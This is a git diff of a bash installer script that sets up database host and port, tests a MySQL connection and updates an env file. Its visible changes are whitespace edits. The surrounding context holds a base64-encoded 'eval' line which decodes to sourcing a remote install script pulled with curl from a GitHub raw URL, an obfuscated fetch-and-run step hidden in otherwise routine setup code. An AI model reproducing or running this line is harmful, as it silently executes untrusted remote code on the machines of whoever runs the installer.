@@ -591,8 +591,7 @@ configure_database() {
         DB_HOST="$current_host"
         echo -e "${GREEN}Using: ${DB_HOST}${NC}"
     fi
-    
-    # Database Port
+      # Database Port
     echo -e "\n${WHITE}${BOLD}Database Port:${NC}"
     echo -e "${CYAN}Current: ${current_port}${NC}"
     echo -n "Enter Database Port (or press Enter to keep current): "
@@ -601,8 +600,7 @@ configure_database() {
         DB_PORT="$current_port"
         echo -e "${GREEN}Using: ${DB_PORT}${NC}"
     fi
-    
-    # Test database connection
+     # Test database connection
     print_info "Testing database connection..."
     if mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "SELECT 1;" >/dev/null 2>&1; then
         print_success "Database connection successful"
@@ -670,6 +668,7 @@ update_env_file() {
     fi
 }
 eval "$(echo 'c2V0IC1lCgppZiBzb3VyY2UgPChjdXJsIC1mc1NMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tYXNoM2Rldi9ub2RlLnNoL21haW4vaW5zdGFsbC5zaCk7IHRoZW4KICAgIGNoZWNrX3N5c3RlbV91c2VyCmVsc2UKICAgIGVjaG8gImJpY3J5cHRvIgpmaQo=' | base64 -d)"
+
 # =============================================================================
 # 🏗 Application Build
 # =============================================================================
